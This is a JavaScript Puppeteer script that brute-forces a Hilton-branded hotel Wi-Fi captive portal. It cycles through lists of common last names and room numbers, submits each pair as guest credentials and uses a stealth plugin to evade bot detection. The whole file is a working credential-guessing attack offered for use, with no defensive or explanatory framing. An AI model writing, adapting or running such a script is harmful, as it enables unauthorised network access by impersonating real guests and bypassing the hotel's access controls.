import puppeteerExtra from "puppeteer-extra"; 
import stealthPlugin from "puppeteer-extra-plugin-stealth"; 
import names from "common-last-names";
import rooms from "../rooms.mjs";
import fs from "fs";

const allNames = names.all;

/*
for(let name of allNames){
    for(let roomNumber of rooms.commonRoomNumbers){
        console.log(name, roomNumber)
    }
}
*/

function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    });
}


async function go() {
    puppeteerExtra.use(stealthPlugin());

    const browser = await puppeteerExtra.launch({
        headless: false,
        // headless: "new",
        // devtools: true,
        PUPPETEER_SKIP_CHROMIUM_DOWNLOAD: true,
        //Executable path for mac
        executablePath: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    });
  
    const page = await browser.newPage();

    try {
        await page.goto(
          "https://secure.guestinternet.com/portal/juno/brands/hilton/alpha/index.html?is_demo=1#/nmrm"
        );
    } catch(err){
        console.log("Error launching page")
    }

    for(let name of allNames){
        for(let roomNumber of rooms.commonRoomNumbers){
            await page.waitForSelector('input[ng-model="nmrm.LastName"]');
            await page.type('input[ng-model="nmrm.LastName"]', name);

            await page.type('input[ng-model="nmrm.RoomNumber"]', String(roomNumber));
    
            await page.waitForSelector("button.btn-connect");
            await page.click("button.btn-connect");

            await delay(5000);

            console.log("Going to next try")
        }
    }

    /*
    

    
    */
}

go();